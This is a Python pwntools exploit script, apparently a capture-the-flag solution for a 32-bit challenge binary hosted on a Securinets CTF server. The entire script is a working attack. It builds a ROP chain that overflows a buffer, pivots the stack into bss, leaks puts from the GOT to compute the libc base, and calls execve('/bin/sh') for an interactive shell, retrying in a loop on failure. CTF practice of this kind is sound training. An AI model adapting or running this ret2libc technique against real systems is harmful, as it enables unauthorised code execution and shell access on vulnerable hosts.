#!/usr/bin/env python3
# Pwninit template - Edited by M0ngi.
from pwn import *
from pwn import p32, u32
from time import sleep


exe = ELF("./main")
libc = ELF("./libc.so.6")

context.binary = exe

sshc = None
r = None
nc = "nc pwn.ctf.securinets.tn 6666"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')

tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
sendl       = lambda x: r.sendline(tobytes(x))
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))


def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return 'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def main():
    global r
    while True:
        try:
            r = conn()
            
            writeable = 0x0804c000 + 0x500
            pop_ebp_leave = 0x080491cf
            pop_ebx = 0x0804901e
            ret = 0x08049224

            gets = 0x8049040
            puts = 0x8049050
            
            rop = b""
            rop += p32(gets)
            rop += p32(pop_ebp_leave)
            rop += p32(writeable)
            
            payload = b"a" * 4
            payload += b"a" * 4
            payload += b"a" * 4
            payload += rop * 5
            payload += b"a" * 4
            payload += b"a" * 4

            sleep(0.5)
            r.sendline(payload)

            
            # Stage 2 saved in bss
            
            payload = p32(ret) * 5
            payload += p32(puts)
            payload += p32(pop_ebx)
            payload += p32(exe.got.puts)
            payload += p32(gets)
            payload += p32(pop_ebx)
            payload += p32(writeable)
            payload += p32(pop_ebp_leave)
            payload += p32(writeable)
            
            r.recvuntil(b' solveable?\n')
            sleep(0.2)
            r.sendline(payload)


            leak = r.readline().strip()[:4]
            log("leak", leak)

            leak_puts = u32(leak)

            libc_base = leak_puts-libc.symbols.puts
            logh("libc_base", libc_base)

            payload = p32(ret) * 4
            payload += p32(libc_base + libc.symbols.execve)
            payload += p32(0)
            payload += p32(libc_base + next(libc.search(b'/bin/sh')))
            payload += p32(0)
            payload += p32(0)
            payload += p32(pop_ebx)
            
            r.sendline(payload)

            r.interactive()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(e)
            pass

if __name__ == "__main__":
    main()

